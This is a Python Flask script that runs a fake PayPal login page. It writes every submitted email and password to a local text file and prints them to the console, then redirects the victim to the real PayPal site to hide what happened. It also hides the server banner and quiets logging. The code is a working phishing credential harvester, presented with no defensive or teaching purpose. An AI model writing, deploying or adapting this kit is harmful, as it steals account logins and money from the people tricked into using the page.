from flask import Flask, render_template, request, redirect, url_for
import datetime
import os
import flask.cli
import logging

flask.cli.show_server_banner = lambda *a, **k: None
logging.getLogger('werkzeug').setLevel(logging.ERROR)


app = Flask(__name__)
app.secret_key = 'dolbaeb'


BASE_DIR = os.path.dirname(os.path.abspath(__file__))

path = "paypal"
os.makedirs(path, exist_ok=True)
LOG_FILE = "paypal.txt"
full = os.path.join(path, LOG_FILE)

@app.route('/')
def index():
    return render_template('paypal.html')


@app.route('/submit_login', methods=['POST'])
def submit_login():
    try:
        email = request.form.get('userid', '').strip()
        password = request.form.get('password', '').strip()

        if email and password:
            with open(full, 'a', encoding='utf-8') as f:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"TIME: {timestamp} | EMAIL: {email} | PASSWORD: {password}\n")
                print(f"✅ Save Information: {email} - {password} -")

            print(f"Login captured - Email: {email} | Password: {password}")

            return redirect('https://www.paypal.com')

        elif email:
            print(f"Email captured: {email}")
            return 'success'

        return redirect(url_for('index'))

    except Exception as e:
        print(f"Error in submit_login: {e}")
        return redirect(url_for('index'))

def run():
    if not os.path.exists(path):
        os.makedirs(path)
        with open(full, 'a', encoding='utf-8') as f:
            f.write("PAYPAL LOGIN LOGGER - Created on " +
                    datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
            f.write("FORMAT: TIME | EMAIL | PASSWORD\n")
            f.write("=" * 80 + "\n")

    app.run(debug=True, host='0.0.0.0', port=5000)


if __name__ == "__main__":
    run()